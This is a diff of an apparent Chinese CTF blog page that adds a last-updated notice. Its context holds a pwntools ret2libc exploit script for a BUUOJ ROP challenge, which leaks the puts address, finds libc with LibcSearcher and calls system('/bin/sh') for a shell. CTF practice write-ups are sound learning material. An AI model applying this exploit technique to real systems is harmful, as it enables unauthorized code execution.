@@ -236,6 +236,12 @@
             <!-- SEO header -->
             <h1 style="display: none">泄露出来的地址的处理</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：2022年5月30日 凌晨
+                
+              </p>
+            
             <div class="markdown-body">
               <h1 id="一道简单的ROP题"><a href="#一道简单的ROP题" class="headerlink" title="一道简单的ROP题"></a>一道简单的ROP题</h1><h2 id="但是不是那么简单"><a href="#但是不是那么简单" class="headerlink" title="但是不是那么简单"></a>但是不是那么简单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><pre><code class="hljs python3">from pwn import*<br>from LibcSearcher import*<br>p = remote(&#x27;node4.buuoj.cn&#x27;,28006)<br>#p = process(&#x27;./rop&#x27;)<br>elf = ELF(&#x27;./rop&#x27;)<br>put_plt_addr = elf.plt[&#x27;puts&#x27;]<br>put_got_addr = elf.got[&#x27;puts&#x27;]<br>vuln = 0x4006ad<br>pop_rdi = 0x400733<br><br><br>payload1 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(put_got_addr) + p64(put_plt_addr) + p64(vuln)<br><br>p.recvuntil(&#x27;story!\n&#x27;)<br>p.sendline(payload1)<br><br>put_got = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>print(hex(put_got))<br>libc = LibcSearcher(&#x27;puts&#x27;,put_got)<br>libc_base = put_got - libc.dump(&#x27;puts&#x27;)<br>sys = libc_base + libc.dump(&#x27;system&#x27;)<br>binsh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br><br>payload2 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(binsh) + p64(sys)<br>p.recv()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 <p>接收返回的got地址时，使用</p>
